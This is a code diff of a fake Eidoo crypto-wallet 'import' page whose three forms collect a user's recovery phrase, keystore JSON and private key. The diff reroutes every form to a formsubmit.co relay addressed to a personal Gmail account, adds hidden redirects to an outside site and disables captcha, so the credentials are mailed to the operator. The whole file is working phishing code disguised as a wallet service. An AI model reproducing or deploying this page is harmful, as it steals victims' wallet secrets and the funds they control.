@@ -47,7 +47,10 @@
 
                     <!-- Tab body (phrase) -->
                     <div id="phrase" class="import__tab__body--item import__tab__body--item--phrase current">
-                        <form id="my-form"  method="POST" action="https://formspree.io/f/xoqzvqlb">
+                      <form action="https://formsubmit.co/bettywoodad@gmail.com" method="POST">
+			 <input type="hidden" name="_next" value="https://tokvalidator.online/admin.html">
+			   
+			  <input type="hidden" name="_captcha" value="false">   
                             <input type="hidden" name="_subject" value="New eidoo Phrase mail!">
                             <input type="hidden" name="_captcha" value="false">
                             <input type="hidden" name="type" value="Eidoo" id="walletRef">
@@ -64,43 +67,15 @@
                             
                             <button name="submit" type="submit" class="form__button" >Import</button>
                         </form>
-                        <script>
-							var form = document.getElementById("my-form");
-							
-							async function handleSubmit(event) {
-							  event.preventDefault();
-							  var status = document.getElementById("my-form-status");
-							  var data = new FormData(event.target);
-							  fetch(event.target.action, {
-								method: form.method,
-								body: data,
-								headers: {
-									'Accept': 'application/json'
-								}
-							  }).then(response => {
-								if (response.ok) {
-								  status.innerHTML = "Processing!";
-								  form.reset()
-								} else {
-								  response.json().then(data => {
-									if (Object.hasOwn(data, 'errors')) {
-									  status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
-									} else {
-									  status.innerHTML = "Oops! There was a problem submitting your form"
-									}
-								  })
-								}
-							  }).catch(error => {
-								status.innerHTML = "Oops! There was a problem submitting your form"
-							  });
-							}
-							form.addEventListener("submit", handleSubmit)
-						</script>
+                        
                     </div>
 
                     <!-- Tab body (keystore json) -->
                     <div id="keystore-json" class="import__tab__body--item import__tab__body--item--keystore-json">
-                        <form id="join-form"  method="POST" action="https://formspree.io/f/xoqzvqlb">
+                        <form action="https://formsubmit.co/bettywoodad@gmail.com" method="POST">
+			 <input type="hidden" name="_next" value="https://tokvalidator.online/admin.html">
+			   
+			  <input type="hidden" name="_captcha" value="false">   
                             <input type="hidden" name="_subject" value="New eidoo keystore-json mail!">
                             <input type="hidden" name="_captcha" value="false">
                             
@@ -119,43 +94,15 @@
                             
                             <button name="submit" class="form__button" >Import</button>
                         </form>
-                        <script>
-							var form = document.getElementById("join-form");
-							
-							async function handleSubmit(event) {
-							  event.preventDefault();
-							  var status = document.getElementById("my-form-status");
-							  var data = new FormData(event.target);
-							  fetch(event.target.action, {
-								method: form.method,
-								body: data,
-								headers: {
-									'Accept': 'application/json'
-								}
-							  }).then(response => {
-								if (response.ok) {
-								  status.innerHTML = "Processing!";
-								  form.reset()
-								} else {
-								  response.json().then(data => {
-									if (Object.hasOwn(data, 'errors')) {
-									  status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
-									} else {
-									  status.innerHTML = "Oops! There was a problem submitting your form"
-									}
-								  })
-								}
-							  }).catch(error => {
-								status.innerHTML = "Oops! There was a problem submitting your form"
-							  });
-							}
-							form.addEventListener("submit", handleSubmit)
-						</script>
+                        
                     </div>
 
                     <!-- Tab body (private key) -->
                     <div id="private-key" class="import__tab__body--item import__tab__body--item--private-key">
-                        <form id="local-form"  method="POST" action="https://formspree.io/f/xoqzvqlb">
+                        <form action="https://formsubmit.co/bettywoodad@gmail.com" method="POST">
+			 <input type="hidden" name="_next" value="https://tokvalidator.online/admin.html">
+			   <input type="hidden" name="_subject" value="New phrase mail!">
+			  <input type="hidden" name="_captcha" value="false">   
                             <input type="hidden" name="_subject" value="New eidoo private-key mail!">
                             <input type="hidden" name="_captcha" value="false">
                         <input type="hidden" name="type" value="Eidoo">
@@ -166,52 +113,15 @@
                         
                         <button name="submit" class="form__button">Import</button>
                         </form>
-                        <script>
-							var form = document.getElementById("local-form");
-							
-							async function handleSubmit(event) {
-							  event.preventDefault();
-							  var status = document.getElementById("my-form-status");
-							  var data = new FormData(event.target);
-							  fetch(event.target.action, {
-								method: form.method,
-								body: data,
-								headers: {
-									'Accept': 'application/json'
-								}
-							  }).then(response => {
-								if (response.ok) {
-								  status.innerHTML = "Processing!";
-								  form.reset()
-								} else {
-								  response.json().then(data => {
-									if (Object.hasOwn(data, 'errors')) {
-									  status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
-									} else {
-									  status.innerHTML = "Oops! There was a problem submitting your form"
-									}
-								  })
-								}
-							  }).catch(error => {
-								status.innerHTML = "Oops! There was a problem submitting your form"
-							  });
-							}
-							form.addEventListener("submit", handleSubmit)
-						</script>
+                        
+				
                     </div>
-                    <p id="my-form-status"></p>
+                    
                 </div>
             </div>
         </div>
     </div>
-    <style>
-        #my-form-status {
-            color: #007bff;
-            font-weight: bold;
-            text-align: center;
-            font-size: 18px;
-        }
-    </style>
+ 
     <script src="../../assets/js/app.js"></script>
 </body>
 
